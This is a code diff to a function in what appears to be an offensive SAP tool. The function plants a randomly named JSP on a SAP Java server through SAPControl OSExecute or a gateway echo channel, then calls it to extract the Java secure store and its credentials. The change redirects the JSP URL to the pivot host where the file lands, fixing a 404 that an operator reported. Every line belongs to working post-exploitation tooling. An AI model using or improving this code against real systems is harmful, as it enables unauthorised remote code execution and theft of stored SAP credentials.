@@ -178,8 +178,24 @@ def extract_java_secstore(node: SAPNode, state: SAPMAPState) -> dict:
     jsp_name = "ss" + "".join(_r.choice(_s.ascii_lowercase) for _ in range(7)) + ".jsp"
     jsp_b64 = _b64.b64encode(_ss.SECSTORE_JSP.encode("utf-8")).decode("ascii")
     target_path = _java_jsp_target_path(node, java_inst, jsp_name)
-    jsp_url = (f"{jsp_scheme}://{node.ip or node.hostname}"
-               f":{http_port}/irj/{jsp_name}")
+    # SAPControl pivot host owns the disk the JSP lands on — in a
+    # multi-server Java cluster (PAS + AAS) the JSP is only reachable
+    # on the pivot host's ICM, not node.hostname (which may be a
+    # different server).  Prefer the pivot host when we're going to
+    # deploy via SAPControl OSExecute.  Operator-reported JP1: pivot
+    # at srv01jp1aas → JSP written to AAS's disk → URL rebuilt with
+    # srv01jp1pas (node.hostname) hit the wrong ICM and got 404.
+    jsp_host = node.ip or node.hostname
+    _sc_pivot = getattr(node, "_cached_sapcontrol_pivot", None) or {}
+    if _sc_pivot.get("url"):
+        try:
+            from urllib.parse import urlparse as _up_sc
+            _sc_host = _up_sc(_sc_pivot["url"]).hostname or ""
+            if _sc_host:
+                jsp_host = _sc_host
+        except Exception:
+            pass
+    jsp_url = f"{jsp_scheme}://{jsp_host}:{http_port}/irj/{jsp_name}"
 
     # When we're about to deploy via the GW / SAPControl chunked-echo
     # channel, the SAPControl pivot instance number (5NN13/14 = SCS)
@@ -222,8 +238,7 @@ def extract_java_secstore(node: SAPNode, state: SAPMAPState) -> dict:
                     http_port = new_http
                 target_path = probed_root + (
                     ("/" if _linux else "\\") + jsp_name)
-                jsp_url = (f"{jsp_scheme}://"
-                           f"{node.ip or node.hostname}"
+                jsp_url = (f"{jsp_scheme}://{jsp_host}"
                            f":{http_port}/irj/{jsp_name}")
                 print(f"[+] {node.sid}: probed Java root — using "
                       f"{probed_root}")
